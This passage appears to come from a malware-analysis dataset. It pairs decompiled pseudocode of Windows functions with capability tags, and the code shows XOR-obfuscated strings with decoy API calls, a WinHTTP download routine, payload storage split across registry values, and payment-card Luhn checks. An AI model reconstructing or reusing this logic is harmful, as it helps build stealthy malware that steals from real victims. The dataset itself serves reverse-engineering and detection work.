5000, 5000, 5000, 5000);\n        uVar1 = (*pcVar7)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        in_ECX = lpMultiByteStr;\n    }\n    if (in_ECX == 0) {\n        puVar6 = NULL;\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(in_ECX);\n        uVar1 = (*pcVar7)(8, (iVar4 + 1) * 2);\n        puVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *puVar6 = 0;\n        lpdwNumberOfBytesAvailable = puVar6;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, puVar6, iVar4 + 1);\n    }\n    nServerPort = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x41dbbc, puVar6, nServerPort, 0);\n    var_2ch = 0x44475a29;\n    var_28h = 0x332a4140;\n    var_24h = 0x5a7b3437;\n    var_20h = 0x411b441c;\n    var_1ch = 0x3437337f;\n    var_18h = 0x44165a7b;\n    var_14h = 0x33754150;\n    var_10h._0_2_ = 0x3444;\n    var_8h = 0x44335a41;\n    var_4h = CONCAT31(var_4h._1_3_, 0x34);\n    uVar1 = (*pcVar7)(8, 0x3d);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_f8h = &var_2ch - iVar4;\n    lpMultiByteStr = iVar4;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        puVar6 = lpdwNumberOfBytesAvailable;\n        if (iVar2 != 0x43369f) {\n            *(iVar5 + iVar4) = *(&var_8h + iVar5 % var_3ch) ^ (iVar5 + iVar4)[var_f8h];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar4, lpdwNumberOfBytesAvailable, 0x50);\n    uVar1 = (*pcVar7)(0, puVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    puVar3 = hRequest;\n    puVar6 = 0x1;\n    if (nServerPort == 0) goto code_r0x0040e735;\n    if (hRequest == NULL) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(hRequest);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, (iVar4 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, puVar3, 0xffffffff, lpdwNumberOfBytesAvailable, iVar4 + 1);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    var_40h = 0x3513711e;\n    var_3ch = 0x7159371b;\n    var_8h = 0x35567159;\n    var_4h = CONCAT22(var_4h._2_2_, 0x374f);\n    uVar1 = (*pcVar7)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar4 = 0;\n    var_f8h = iVar5;\n    hRequest = &var_40h - iVar5;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        if (iVar2 != 0x2f1190) {\n            *(iVar4 + iVar5) = *(&var_8h + iVar4 % lpdwNumberOfBytesRead) ^ (iVar4 + iVar5)[&var_40h - iVar5];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 8);\n    puVar3 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)\n                       (nServerPort, iVar5, lpdwNumberOfBytesAvailable, 0, 0, 0, 0x800140);\n    hRequest = puVar3;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpdwNumberOfBytesAvailable);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    iVar4 = lpMultiByteStr;\n    if (puVar3 == NULL) {\ncode_r0x0040e70f:\n        lpdwNumberOfBytesAvailable = 0x1;\n    }\n    else {\n        var_108h = 0x3300;\n        var_10ch = 8;\n        iVar2 = fcn.004038a8();\n        if (iVar2 != 0) {\n            var_4h = 0;\n            var_8h = &var_418h;\n            lpBuffer = 3;\n            (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x26, &lpBuffer, 0xc);\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x1f, &var_108h, 4);\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar3, 0x3f, &var_10ch, 4);\n        if (arg_18h != 0) {\n            var_30h = 0x32554817;\n            var_2ch = 0x48227102;\n            var_28h = 0x71563251;\n            var_24h = 0x32564865;\n            var_20h = 0x48317115;\n            var_1ch = 0x711f3251;\n            var_18h = 0x32114878;\n            var_14h = 0x48687108;\n            var_10h._0_2_ = 0x3234;\n            var_8h = 0x32344845;\n            var_4h = CONCAT22(var_4h._2_2_, 0x716c);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x45);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar5 = 0;\n            lpdwNumberOfBytesAvailable = &var_30h - iVar4;\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                if (iVar2 != 0x7ab525) {\n                    *(iVar5 + iVar4) =\n                         *(&var_8h + iVar5 % lpdwNumberOfBytesRead) ^ *((&var_30h - iVar4) + iVar5 + iVar4);\n                }\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < 0x22);\n            (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar4, arg_18h);\n            uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszHeaders, 0x10000000);\n            puVar3 = hRequest;\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(hRequest, &lpszHeaders, uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            iVar4 = lpMultiByteStr;\n            iVar5 = var_f8h;\n        }\n        iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(puVar3, 0, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar2 == 0) || (iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(puVar3, 0),  iVar2 == 0))\n        goto code_r0x0040e70f;\n        lpdwBufferLength = 4;\n        var_f4h = 0;\n        var_f0h = 0;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar3, 0x20000005, 0, &var_f4h, &lpdwBufferLength, 0);\n        if (*arg_10h == 0) {\n            *arg_10h = var_f4h;\n        }\n        lpdwBufferLength = 4;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar3, 0x20000013, 0, &var_f0h, &lpdwBufferLength, 0);\n        if ((var_f0h == 0xce) || (var_f0h == 200)) {\n            if (var_44h[1] == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_f4h);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                *var_44h = 0;\n                var_44h[1] = iVar2;\n            }\n            arg_18h = var_44h[1];\n            lpdwNumberOfBytesRead = NULL;\n            do {\n                lpdwNumberOfBytesAvailable = NULL;\n                iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(puVar3, &lpdwNumberOfBytesAvailable);\n                if ((iVar2 == 0) ||\n                   (iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                                      (puVar3, *var_44h + arg_18h, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead), \n                   iVar2 == 0)) {\n                    lpdwNumberOfBytesAvailable = 0x4;\n                    goto code_r0x0040e712;\n                }\n                *var_44h = *var_44h + lpdwNumberOfBytesRead;\n                iVar2 = *var_44h;\n            } while (lpdwNumberOfBytesAvailable != NULL);\n            *arg_14h = iVar2;\n            if ((*arg_10h == 0) || (iVar2 == *arg_10h)) {\n                lpdwNumberOfBytesAvailable = NULL;\n            }\n            else {\n                lpdwNumberOfBytesAvailable = 0x6;\n            }\n        }\n        else {\n            lpdwNumberOfBytesAvailable = 0x3;\n        }\n    }\ncode_r0x0040e712:\n    if (puVar3 != NULL) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(puVar3);\n    }\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    puVar6 = lpdwNumberOfBytesAvailable;\ncode_r0x0040e735:\n    uVar1 = (*pcVar7)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    if (nServerPort != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(nServerPort);\n    }\n    return puVar6;\n}\n",
        "token_count": 4835
    },
    "0040eb15": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040eb15(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    char *pcVar3;\n    uint uVar4;\n    char *pcVar5;\n    uint *puVar6;\n    char *pcVar7;\n    uint var_d4h;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar6 = &var_8h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    uVar4 = 0;\n    puVar6 = &var_d4h;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    if ((*in_ECX != 0) && (in_ECX[1] != 0)) {\n        iVar2 = fcn.0040935e();\n        if (-1 < iVar2) {\n            var_ch = fcn.0040954d(var_4h, var_8h);\n            if (var_ch != NULL) {\n                pcVar3 = str.EFFDZ.;\n                pcVar5 = var_ch;\n                for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *pcVar5 = '\\0';\n                    pcVar5 = pcVar5 + 1;\n                }\n                pcVar5 = str.EFFDZ.;\n                pcVar7 = var_ch;\n                for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *pcVar7 = *pcVar5;\n                    pcVar5 = pcVar5 + 1;\n                    pcVar7 = pcVar7 + 1;\n                }\n                pcVar5 = var_ch;\n                for (iVar2 = 0x140; pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyA,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *pcVar5 = '\\0';\n                    pcVar5 = pcVar5 + 1;\n                }\n                (*_sym.imp.KERNEL32.dll_lstrcpyA)(var_ch, str.EFFDZ. + arg_8h * 0x20);\n                pcVar5 = var_ch;\n                do {\n                    pcVar5 = pcVar5 + 0x20;\n                    if (*pcVar3 != '\\0') {\n                        (*pcVar1)(pcVar5, pcVar3);\n                    }\n                    pcVar3 = pcVar3 + 0x20;\n                } while (pcVar3 < 0x413420);\n            }\n            fcn.00409a4e();\n            *0x41ddc8 = var_8h;\n            uVar4 = 1;\n            *0x41ddcc = var_4h;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 702
    },
    "0040fe03": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040fe03(int32_t *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    code *pcVar11;\n    uint ARG_0;\n    uint lpValueName;\n    int32_t var_74h;\n    int32_t var_70h;\n    uchar *var_68h;\n    uchar *var_64h;\n    int32_t *var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uchar *var_50h;\n    uchar *var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpType;\n    uchar *lpcbData;\n    int32_t hKey;\n    uint var_1h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    *param_1 = 0;\n    param_1[1] = 0;\n    var_60h = param_1;\n    lpType = param_2;\n    uVar2 = (*pcVar11)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        var_5ch = iVar3;\n        fcn.00410115();\n        var_70h = fcn.0040fdaa(0x20019);\n        if (var_70h != 0) {\n            var_58h = 0;\n            var_48h = 0x42026c33;\n            puVar9 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_44h = 0x6b0d5123;\n            puVar9 = &lpValueName;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_40h = 0x6c284d30;\n            var_3ch = 0x51204222;\n            var_38h = 0x4d256b0d;\n            var_34h = 0x424e6c34;\n            var_30h = 0x6b6c5129;\n            var_20h = 0x426b6c51;\n            var_1ch = CONCAT31(var_1ch._1_3_, 0x4d);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            var_54h = 5;\n            iVar8 = 0;\n            var_74h = iVar3;\n            do {\n                iVar4 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                if (iVar4 != 0xfecc74) {\n                    *(iVar8 + iVar3) = *(&var_20h + iVar8 % var_54h) ^ (iVar8 + iVar3)[&var_48h - iVar3];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar3, lpType);\n            var_2ch = 0x6710694d;\n            var_28h = 0x634c681d;\n            var_24h = 0x69684203;\n            var_18h = 0x67636968;\n            var_14h._0_1_ = 0x42;\n            do {\n                pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puVar9 = &var_20h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                puVar9 = &lpValueName;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                hKey = &var_2ch - iVar3;\n                var_1ch = iVar3;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                    iVar4 = var_58h;\n                    if (iVar5 != 0x3f9581) {\n                        *(iVar8 + iVar3) = *(&var_18h + iVar8 % var_54h) ^ (iVar8 + iVar3)[hKey];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0xc);\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar3, &ARG_0, var_58h);\n                var_1h._0_1_ = '\\0';\n                var_4ch = NULL;\n                var_58h = iVar4 + 1;\n                var_50h = NULL;\n                hKey = fcn.0040fdaa(0x20019);\n                param_1 = var_60h;\n                if (hKey != 0) {\n                    lpType = 3;\n                    lpcbData = NULL;\n                    var_68h = NULL;\n                    iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, &lpValueName, 0, &lpType, 0, &lpcbData);\n                    if (iVar8 == 0) {\n                        uVar2 = (*pcVar11)(8, lpcbData);\n                        var_64h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        puVar7 = var_68h;\n                        puVar6 = var_68h;\n                        if ((var_64h == NULL) ||\n                           (iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                              (hKey, &lpValueName, 0, &lpType, var_64h, &lpcbData),  puVar7 = var_64h, \n                           puVar6 = lpcbData,  iVar8 == 0)) {\n                            var_1h._0_1_ = '\\x01';\n                            var_50h = puVar6;\n                            var_4ch = puVar7;\n                        }\n                    }\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                    if (((var_1h != '\\0') && (var_4ch != NULL)) && (var_50h != NULL)) {\n                        if (param_1[1] == 0) {\n                            uVar2 = (*pcVar11)(8, var_50h);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        }\n                        else {\n                            uVar2 = (*pcVar11)(0, param_1[1], var_50h + *param_1);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar2);\n                        }\n                        param_1[1] = iVar3;\n                        puVar6 = var_4ch;\n                        puVar10 = iVar3 + *param_1;\n                        for (puVar7 = var_50h; puVar7 != NULL; puVar7 = puVar7 + -1) {\n                            *puVar10 = *puVar6;\n                            puVar6 = puVar6 + 1;\n                            puVar10 = puVar10 + 1;\n                        }\n                        *param_1 = var_50h + *param_1;\n                        pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4ch);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                        iVar3 = var_1ch;\n                    }\n                }\n                uVar2 = (*pcVar11)(0, iVar3);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_70h);\n            uVar2 = (*pcVar11)(0, var_74h);\n            (*pcVar1)(uVar2);\n            iVar3 = var_5ch;\n        }\n        uVar2 = (*pcVar11)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2257
    },
    "004102a1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004102a1(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint ARG_0;\n    uint lpValueName;\n    uint32_t var_58h;\n    int32_t var_54h;\n    int32_t *var_50h;\n    uint32_t var_4ch;\n    int32_t hKey;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_20h = var_20h & 0xffffff00;\n    var_50h = param_1;\n    var_ch = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if ((((uVar2 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_58h = uVar2;\n        fcn.00410115();\n        hKey = fcn.0040fdaa(0x20006);\n        if (hKey != 0) {\n            var_44h = *param_1;\n            var_3ch = 0x42026c33;\n            var_38h = 0x6b0d5123;\n            var_34h = 0x6c284d30;\n            var_30h = 0x51204222;\n            var_2ch = 0x4d256b0d;\n            var_28h = 0x424e6c34;\n            var_4ch = (((var_44h + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            puVar7 = &ARG_0;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_24h = 0x6b6c5129;\n            puVar7 = &lpValueName;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_8h = 0x426b6c51;\n            var_4h._0_1_ = 0x4d;\n            uVar1 = (*pcVar5)(8, 0x39);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            var_40h = 5;\n            iVar6 = 0;\n            var_54h = iVar4;\n            do {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                if (iVar3 != 0xfecc74) {\n                    *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_40h) ^ (iVar6 + iVar4)[&var_3ch - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar4, var_ch);\n            var_ch = 0;\n            var_18h = 0x6710694d;\n            var_14h = 0x634c681d;\n            var_10h = 0x69684203;\n            var_8h = 0x67636968;\n            var_4h._0_1_ = 0x42;\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            do {\n                uVar1 = (*pcVar5)(8, 0x19);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_1ch = &var_18h - iVar4;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                    if (iVar3 != 0x3f9581) {\n                        *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_40h) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0xc);\n                puVar7 = &lpValueName;\n                for (iVar6 = 0x40; iVar3 = var_ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_ch);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                var_ch = iVar3 + 1;\n            } while (var_ch < 0x32);\n            var_1ch = 0;\n            if (0 < var_4ch) {\n                var_ch = 0;\n                var_18h = 0x6710694d;\n                var_14h = 0x634c681d;\n                var_10h = 0x69684203;\n                var_8h = 0x67636968;\n                var_4h._0_1_ = 0x42;\n                do {\n                    uVar1 = (*pcVar5)(8, 0x19);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar6 = 0;\n                    var_20h = &var_18h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                        if (iVar3 != 0x3f9581) {\n                            *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_40h) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0xc);\n                    puVar7 = &lpValueName;\n                    for (iVar6 = 0x40; iVar3 = var_1ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_1ch);\n                    iVar6 = 0x7d000;\n                    if (var_44h < 0x7d000) {\n                        iVar6 = var_44h;\n                    }\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)\n                                      (hKey, &lpValueName, 0, 3, var_50h[1] + var_ch, iVar6);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    var_20h = -iVar6 & 0xffffff00U | 1 - (iVar6 != 0);\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    var_1ch = iVar3 + 1;\n                    var_ch = var_ch + 0x7d000;\n                    var_44h = var_44h + -0x7d000;\n                } while (var_1ch < var_4ch);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar1 = (*pcVar5)(0, var_54h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar2 = var_58h;\n        }\n        uVar1 = (*pcVar5)(0, uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return uVar2 & 0xffffff00 | var_20h & 0xff;\n}\n",
        "token_count": 2106
    },
    "00401832": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401832(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x41dad8 = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 361
    },
    "00405094": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00405094(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_20h = 0x2041070b;\n    var_1ch = 0x51591a37;\n    var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x37);\n    var_14h = 0x4137636a;\n    var_10h._0_2_ = 0x7347;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar3 != 0xf99a6c) {\n            var_8h = 6;\n            *(iVar6 + iVar2) = *(&var_14h + iVar6 % 6) ^ (iVar6 + iVar2)[&var_20h - iVar2];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 9);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41db14 == NULL) {\n        var_28h = 0xc212c03;\n        var_24h = 0x27133d01;\n        var_20h = 0x3c240716;\n        var_1ch = 0x6354163d;\n        var_18h._0_2_ = 0x5263;\n        var_14h = 0x78525550;\n        var_10h._0_2_ = CONCAT11(var_10h._1_1_, 100);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n        